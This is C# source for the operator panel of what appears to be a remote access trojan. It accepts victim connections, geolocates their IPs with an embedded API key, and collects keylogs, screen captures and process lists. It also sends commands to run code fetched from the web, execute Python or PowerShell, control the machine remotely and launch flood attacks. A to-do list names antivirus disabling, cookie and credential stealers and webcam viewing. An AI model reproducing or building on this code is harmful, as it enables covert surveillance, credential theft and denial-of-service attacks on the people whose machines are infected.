using Newtonsoft.Json.Linq;
using Server.Forms;
using Server.Settings;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Server
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        bool Debug = false;
        bool ard = true;
        public string LText = null;
        string Logs(string add = null, bool print = false)
        {
            if (add == null) return LText;
            if(print)
            {
                if(add == "Waiting for a Connection")
                {
                    if(ard)
                    {
                        LText += add + "\n";
                        richTextBox1.Invoke(new Action(() => { richTextBox1.Text = LText; }));
                        ard = true;
                    }
                }
                else
                {
                    LText += add + "\n";
                    richTextBox1.Invoke(new Action(() => { richTextBox1.Text = LText; }));
                }
                

            }
            return "";
        }
        bool type(string k,string l)
        {
            if (k.Split('|')[0] == l) return true;
            return false;
        }
        bool testc = false;
        public string keylogs = "s";
        public string dirs = "s";
        void AfterData(string data, string ip)
        {
            if(type(data,"NEW"))
            {       
                string news = data.Split('|')[1];
                foreach (DataGridViewRow row in dataGridView1.Rows)
                {
                    string ok = "m";
                    try { ok = row.Cells[0].Value.ToString(); } catch { 
                    }
                    
                    if (ok == ip)
                    {
                        return;
                    }
                }
                string usernam = news.Split('@')[1];
               // string os = news.Split('@')[2];
                WebClient d = new WebClient();
                string jsons = d.DownloadString("http://api.ipstack.com/" + ip + "?access_key=5c5c8be59fbb6308eb9e4474b2c78e53&format=1");
                var jo = JObject.Parse(jsons);
                var id = jo["country_name"].ToString();
                dataGridView1.Invoke(new Action(() => { dataGridView1.Rows.Add(ip,id,usernam, "Connected","ognpre"); }));
            }
            else if (type(data, "RECIVED"))
            {
                File.WriteAllText(@"C:\Users\tewni\Desktop\nain\temp.txt", data.Split('|')[1]);
            }
            else if (type(data, "RECIVEDF"))
            {
                File.WriteAllText(@"C:\Users\tewni\Desktop\nain\temps.txt", data.Split('|')[1]);
            }
            else if (type(data, "PONG"))
            {
                testc = true;
                MessageBox.Show("Connection is Stable!");
            }
            else if(type(data, "GETKEY"))
            {
                keylogs = data.Split('|')[1].Split('@')[0];
                File.WriteAllText(@"C:\Users\tewni\Desktop\nain\logs1.txt", keylogs);
            }
            else if (type(data, "GOTDD"))
            {
                File.Delete(@"C:\Users\tewni\Desktop\nain\tempProcess.txt");
                File.WriteAllText(@"C:\Users\tewni\Desktop\nain\tempProcess.txt", data.Split('|')[1]);
            }
            else if (type(data, "RESPONSE_PY"))
            {
                MessageBox.Show("Python code has ran. Response: \"" + data.Split('|')[1] + "\"");
            }
            else if (type(data, "REMOTEC"))
            {
                string news = data.Split('|')[1];
                Byte[] bytes = Convert.FromBase64String(news.Split('@')[0]);  
                try
                {
                    File.WriteAllBytes("C:\\Users\\tewni\\Desktop\\nain\\now.png", bytes);
                }
                catch
                {

                }
                
            }
            else
            {

            }
        }
        #region ignore
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();


        #endregion
        void Listen()
        {
            TcpListener server = null;
            Int32 port = 7465;
            IPAddress localAddr = IPAddress.Any;
            server = new TcpListener(localAddr, port);
            server.Start();

            Byte[] bytes = new Byte[485205];
            String data = null;
            while (true)
            {
                Logs("Waiting for a Connection", Debug);
                TcpClient client = server.AcceptTcpClient();
                Logs("Connected!",Debug);
                ard = true;

                data = null;
                NetworkStream stream = client.GetStream();

                int i;
                while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                {
                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                }
                Logs("Got data: " + data,Debug);
                AfterData(data, ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString());
                client.Close();
                Logs("Lost Connection",Debug);
            }
    }
        protected void Application_Error(Object sender, EventArgs e)
        {
            MessageBox.Show("error");
        }
        private async void Form1_Load(object sender, EventArgs e)
        {
            /* To-Do
             * JSON Settings and R/W/C/S ✔
             * JSON Settings in use ✘
             * Python 2.7 Installer ✔
             * Python 2.7 PIP Installer ✘
             * Python 2.7 Script Executer ✔
             * Python 3.0 Installer ✘
             * Python 3.0 Script Executer ✘
             * System Infomartion ✘
             * File Manager ✔
             * Startup Manager ✘
             * Anti Virus Disable ✔
             * Task Manager ✔
             * Remote Shell ✘
             * Registry Editor ✘
             * Webcam View ✘
             * Cookie Stealer ✘
             * Credential Stealer ✘
            */
            AppDomain.CurrentDomain.UnhandledException += Application_Error;
            try
            {
             //   this.Location = Screen.AllScreens[1].WorkingArea.Location;
            }catch{}
            await Task.Factory.StartNew(() => Listen());
        }
        string selected2 = "";
        public void SendData(String data)
        {
            try
            {          
                TcpClient client = new TcpClient(selected2, 7464);
                NetworkStream nwStream = client.GetStream();
                Byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(data);
                nwStream.Write(bytesToSend, 0, bytesToSend.Length);
                Logs("Sending: " + data + selected2, Debug);
                client.Close();
            }
            catch(Exception ex)
            {
                testc = false;
            }
        }
        private void messageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            Msg news = new Msg();
            news.Show();
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            KeyLogg key = new KeyLogg();
            key.Show();
        }

        private void visitWebisiteToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            WebsiteF fd = new WebsiteF();
            fd.Show();
        }

        private void fiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            RunFromWEB d = new RunFromWEB();
            d.Show();
        }

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            RunFromLocal d = new RunFromLocal();
            d.Show();
        }

        private void remoteControlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            RMote cd = new RMote();
            cd.Show();      
        }

        private async void testConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            testc = false;
            SendData("PING|@");
            await Task.Delay(15000);
            if (testc == false) {
                foreach(DataGridViewRow row in dataGridView1.Rows) {
                    string ok = ",";
                    try { ok = row.Cells[0].Value.ToString(); }
                    catch
                    {
                    }
                    if (ok == selected2)
                    {
                        dataGridView1.Rows.RemoveAt(row.Index);
                    }
                }
                MessageBox.Show("Client is Offline."); 
            }
        }

        private void miscToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void unistallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            SendData("EXT|@");
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            testc = false;
            SendData("PING|@");
            if (testc == false)
            {
                foreach (DataGridViewRow row in dataGridView1.Rows)
                {
                    string ok = ",";
                    try { ok = row.Cells[0].Value.ToString(); }
                    catch
                    {
                    }
                    if (ok == selected2)
                    {
                        dataGridView1.Rows.RemoveAt(row.Index);
                    }
                }
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            SendData("DSC|@");
            if (testc == false)
            {
                foreach (DataGridViewRow row in dataGridView1.Rows)
                {
                    string ok = ",";
                    try { ok = row.Cells[0].Value.ToString(); }
                    catch
                    {
                    }
                    if (ok == selected2)
                    {
                        dataGridView1.Rows.RemoveAt(row.Index);
                    }
                }
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            SendData("DSC|@");
            if (testc == false)
            {
                foreach (DataGridViewRow row in dataGridView1.Rows)
                {
                    string ok = ",";
                    try { ok = row.Cells[0].Value.ToString(); }
                    catch
                    {
                    }
                    if (ok == selected2)
                    {
                        dataGridView1.Rows.RemoveAt(row.Index);
                    }
                }
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            File_Manager f = new File_Manager();
            f.Show();
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AboutForm f = new AboutForm();
            f.Show();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form3 ok = new Form3();
            ok.Show();
        }

        private void systemInfomartionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            Task_Manager d = new Task_Manager();
            d.Show();
        }

        private void credentialStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
        }

        private void cookieStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
        }

        private void webcamViewToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
        }

        private void antiVirusDisableToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            selected2 = dataGridView1.CurrentRow.Cells[0].Value.ToString();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string code = Clipboard.GetText();
            if(!code.Contains("try {"))
            {
                string dones = "try {\n" + code + "\n} catch(Exception^ j) {}";
                Clipboard.SetText(dones);
            }

        }

        private void hitToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void installPython27ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void runPython27ToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void installPython27ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            SendData("INSTALLPY|@");
        }

        private void runPythonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Newpu ms = new Newpu();
            ms.Show();
        }

        private void runPowershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RunPs d = new RunPs();
            d.Show();
        }

        private void simpleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mainy mainys = new mainy();
            mainys.Show();
        }

        private void hulkpyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HulkPy D = new HulkPy();
            D.Show();
        }

        private void extreme1004000RQToolStripMenuItem_Click(object sender, EventArgs e)
        {
            suur sf = new suur();
            sf.Show();
        }

        private void python27ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
    }
}